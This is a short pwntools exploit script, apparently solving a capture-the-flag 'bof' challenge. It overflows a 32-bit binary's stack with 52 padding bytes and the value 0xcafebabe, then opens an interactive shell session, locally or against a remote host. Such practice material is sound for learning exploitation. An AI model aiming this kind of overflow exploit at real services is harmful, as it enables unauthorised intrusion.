from pwn import *
from struct import pack
from Crypto.Util.number import bytes_to_long as btl, long_to_bytes as ltb
import sys

BINARY = "bof"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 32
context.arch = "i386"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script):
        if not args.RMT:
            attach(self.p, script)

    def send(self, content):
        p = self.p
        p.sendline(content)

x, p = init()

payload = flat(
    cyclic(52),
    0xcafebabe,
)

x.debug("b *main\nfinish\nfinish\nfinish\nfinish\nfinish\nx/wx $ebp+8")
x.send(payload)

p.interactive()